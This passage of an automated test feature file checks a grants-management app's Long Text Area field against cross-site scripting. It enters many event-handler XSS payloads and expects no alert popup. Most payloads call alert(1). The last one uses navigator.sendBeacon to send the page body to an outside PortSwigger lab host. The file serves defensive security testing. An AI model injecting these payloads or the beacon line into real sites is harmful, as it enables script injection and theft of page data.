      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                             | Field                          |
      | <xss onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</xss><input value=clickme> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304226 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                           | Field                          |
      | <video onfullscreenchange=alert(1) src=validvideo.mp4 controls> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304227 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                              | Field                          |
      | <input oninput=alert(1) value=xss> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304228 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                        | Field                          |
      | <form><input oninvalid=alert(1) required><input type=submit> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |


  @304229 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                    | Field                          |
      | <xss onkeydown="alert(1)" contenteditable style=display:block>test</xss> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304231 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                    | Field                          |
      | <xss onkeydown="alert(1)" contenteditable style=display:block>test</xss> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304232 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                     | Field                          |
      | <xss onkeypress="alert(1)" contenteditable style=display:block>test</xss> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304233 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                  | Field                          |
      | <xss onkeyup="alert(1)" contenteditable style=display:block>test</xss> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304235 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                      | Field                          |
      | <xss onmousedown="alert(1)" style=display:block>test</xss> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304236 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                       | Field                          |
      | <xss onmouseenter="alert(1)" style=display:block>test</xss> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304238 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                       | Field                          |
      | <xss onmouseleave="alert(1)" style=display:block>test</xss> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304239 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                      | Field                          |
      | <xss onmousemove="alert(1)" style=display:block>test</xss> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304241 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                     | Field                          |
      | <xss onmouseout="alert(1)" style=display:block>test</xss> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304243 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                      | Field                          |
      | <xss onmouseover="alert(1)" style=display:block>test</xss> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304244 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                    | Field                          |
      | <xss onmouseup="alert(1)" style=display:block>test</xss> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304245 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                           | Field                          |
      | <xss onmousewheel=alert(1) style=display:block> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304246 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                              | Field                          |
      | <video onmozfullscreenchange=alert(1) src=validvideo.mp4 controls> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @304247 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the Long Text Area field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-23578                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for record number "1"
    When I enter values into fields
      | Value                                                                                                 | Field                          |
      | <body onpagehide=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)> | fieldBeneficiaryEligibility__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
